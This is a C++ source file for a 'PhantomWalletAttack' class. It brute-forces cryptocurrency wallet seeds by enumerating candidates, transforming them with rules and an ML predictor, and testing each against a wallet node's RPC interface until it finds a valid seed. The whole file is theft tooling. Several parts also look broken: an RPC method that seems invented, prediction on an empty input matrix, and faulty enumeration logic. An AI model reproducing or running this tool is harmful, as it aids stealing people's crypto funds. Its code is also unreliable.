#include "phantom_wallet.h"
#include <iostream>
#include <fstream>
#include <curl/curl.h>
#include <json/json.h>

PhantomWalletAttack::PhantomWalletAttack(GPUManager* gpuManager, MLPredictor* mlPredictor, RuleEngine* ruleEngine, 
                                         Logger* logger, ThreadingUtils* threadingUtils, DBManager* dbManager)
    : gpuManager(gpuManager), mlPredictor(mlPredictor), ruleEngine(ruleEngine), 
      logger(logger), threadingUtils(threadingUtils), dbManager(dbManager), curl(nullptr) {}

void PhantomWalletAttack::loadConfiguration(const std::string& configPath) {
    logger->info("Loading configuration from " + configPath, {"PhantomWalletAttack", "Configuration"});

    std::ifstream configFile(configPath);
    if (!configFile.is_open()) {
        logger->error("Failed to open configuration file: " + configPath, {"PhantomWalletAttack", "Configuration"});
        return;
    }

    Json::Value config;
    configFile >> config;

    phantomWalletNodeUrl = config.get("phantomWalletNodeUrl", "http://127.0.0.1:8332").asString();
    rpcUser = config.get("rpcUser", "user").asString();
    rpcPassword = config.get("rpcPassword", "password").asString();

    logger->info("Configuration loaded successfully.", {"PhantomWalletAttack", "Configuration"});
}

void PhantomWalletAttack::connectToPhantomWalletNode() {
    logger->info("Connecting to Phantom Wallet node...", {"PhantomWalletAttack", "Connection"});
    curl = curl_easy_init();
    if (!curl) {
        logger->error("Failed to initialize CURL", {"PhantomWalletAttack", "Connection"});
        throw std::runtime_error("CURL initialization failed");
    }
}

void PhantomWalletAttack::disconnectFromPhantomWalletNode() {
    logger->info("Disconnecting from Phantom Wallet node...", {"PhantomWalletAttack", "Connection"});
    if (curl) {
        curl_easy_cleanup(curl);
        curl = nullptr;
    }
}

bool PhantomWalletAttack::sendRpcRequest(const std::string& method, const Json::Value& params, Json::Value& result) {
    if (!curl) {
        logger->error("No active CURL session", {"PhantomWalletAttack", "RPCRequest"});
        return false;
    }

    Json::Value rpcRequest;
    rpcRequest["jsonrpc"] = "1.0";
    rpcRequest["id"] = "curltest";
    rpcRequest["method"] = method;
    rpcRequest["params"] = params;

    std::string requestData = rpcRequest.toStyledString();
    std::string responseString;
    
    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, phantomWalletNodeUrl.c_str());
    curl_easy_setopt(curl, CURLOPT_USERPWD, (rpcUser + ":" + rpcPassword).c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, requestData.c_str());

    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, [](char* buffer, size_t size, size_t nmemb, std::string* out) {
        out->append(buffer, size * nmemb);
        return size * nmemb;
    });
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &responseString);

    CURLcode res = curl_easy_perform(curl);
    curl_slist_free_all(headers);

    if (res != CURLE_OK) {
        logger->error("CURL error: " + std::string(curl_easy_strerror(res)), {"PhantomWalletAttack", "RPCRequest"});
        return false;
    }

    Json::CharReaderBuilder reader;
    std::string errs;
    if (!Json::parseFromStream(reader, responseString, &result, &errs)) {
        logger->error("Failed to parse JSON response: " + errs, {"PhantomWalletAttack", "RPCRequest"});
        return false;
    }

    return true;
}

bool PhantomWalletAttack::checkSeedInPhantomWalletNode(const std::string& seed) {
    logger->info("Checking seed: " + seed, {"PhantomWalletAttack", "SeedCheck"});

    Json::Value params(Json::arrayValue);
    params.append(seed);

    Json::Value result;
    if (!sendRpcRequest("validateseed", params, result)) {
        logger->error("Failed to send RPC request", {"PhantomWalletAttack", "SeedCheck"});
        return false;
    }

    if (result.isMember("result") && result["result"].asBool()) {
        logger->info("Seed is valid: " + seed, {"PhantomWalletAttack", "SeedCheck"});
        return true;
    } else {
        logger->info("Seed is invalid: " + seed, {"PhantomWalletAttack", "SeedCheck"});
        return false;
    }
}

void PhantomWalletAttack::setAttackCallback(std::function<std::string()> attackCallback) {
    this->attackCallback = attackCallback;
}

std::vector<std::string> PhantomWalletAttack::generateSeeds(size_t length, const std::string& charset) {
    std::vector<std::string> seeds;
    std::string seed(length, charset[0]);
    while (true) {
        seeds.push_back(seed);
        size_t pos = 0;
        while (pos < length && ++seed[pos] == charset.size()) {
            seed[pos] = charset[0];
            ++pos;
        }
        if (pos == length) break;
    }
    return seeds;
}

void PhantomWalletAttack::applyMachineLearningModel(std::vector<std::string>& seeds) {
    arma::mat inputData;
    arma::Row<size_t> predictions = mlPredictor->predict(inputData);
    for (size_t i = 0; i < seeds.size(); ++i) {
        seeds[i] += "_" + std::to_string(predictions[i]);
    }
}

void PhantomWalletAttack::applyRulesToSeeds(std::vector<std::string>& seeds) {
    std::vector<std::string> transformedSeeds;
    for (const auto& seed : seeds) {
        auto transformed = ruleEngine->applyRules(seed);
        transformedSeeds.insert(transformedSeeds.end(), transformed.begin(), transformed.end());
    }
    seeds = std::move(transformedSeeds);
}

void PhantomWalletAttack::execute() {
    logger->info("Starting Phantom Wallet attack.", {"PhantomWalletAttack", "Execution"});

    connectToPhantomWalletNode();

    while (!stopFlag) {
        if (attackCallback) {
            std::string seed = attackCallback();
            if (seed.empty()) {
                logger->info("No more seeds to check. Stopping attack.", {"PhantomWalletAttack", "Execution"});
                break;
            }

            if (checkSeedInPhantomWalletNode(seed)) {
                logger->info("Successful seed found: " + seed, {"PhantomWalletAttack", "Execution"});
                break;
            }
        } else {
            logger->error("Attack callback is not set!", {"PhantomWalletAttack", "Execution"});
            break;
        }
    }

    disconnectFromPhantomWalletNode();

    logger->info("Phantom Wallet attack completed.", {"PhantomWalletAttack", "Execution"});
}

